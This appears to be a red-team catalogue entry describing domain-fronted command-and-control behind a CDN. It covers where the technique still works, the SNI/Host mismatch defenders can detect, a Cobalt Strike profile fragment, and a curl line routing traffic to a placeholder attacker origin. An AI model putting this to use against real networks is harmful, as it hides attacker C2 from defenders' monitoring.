---
id: domain-fronting-cdn
title: Domain-fronted C2 (high-reputation CDN edge)
section: Command & Control
phase: Command & Control
attack:
  tactic: TA0011
  techniques: [T1090.004]
platform: [windows, network]
source: MITRE ATT&CK T1090.004; malleable-profile domain fronting
pair: domain-fronting-sni-mismatch
---

Front the C2 behind a shared CDN: the TLS SNI (and DNS) name a high-reputation edge
domain the CDN serves, so egress filtering and reputation see benign traffic, while
the inner HTTP `Host:` header routes the request to the attacker's origin on that
same CDN. Defenders watching the SNI never see the real destination. The tell is the
mismatch itself — the encrypted Host disagreeing with the SNI — plus the CDN edge
being contacted by a non-browser process.

**Currency — assume this is closed on the big four.** Classic fronting was deliberately
broken by the major CDNs between roughly 2018 and 2021: AWS CloudFront, Google, Azure and
Fastly all added SNI/Host matching, so an inner `Host` that disagrees with the SNI is
rejected at the edge rather than routed. Treat this entry as the *shape* of the technique,
not a working recipe against those providers — where it still lands is smaller or
misconfigured CDNs that never added the check, multi-tenant fronts inside a single account,
and the domain-*borrowing* variants (an attacker-controlled hostname on the same
high-reputation CDN, SNI and Host agreeing). Test the front before you rely on it.

```sh
# Cobalt Strike malleable profile: front on a benign CDN domain, route via Host
#   set host_stage "false";
#   http-get { set uri "/api/v1/collect"; client { header "Host" "<attacker-origin.cdn>"; } }
# curl illustration of the fronting shape (SNI != Host):
curl -s -H "Host: <attacker-origin.cdn>" https://<benign-front.cdn>/api/v1/collect
```
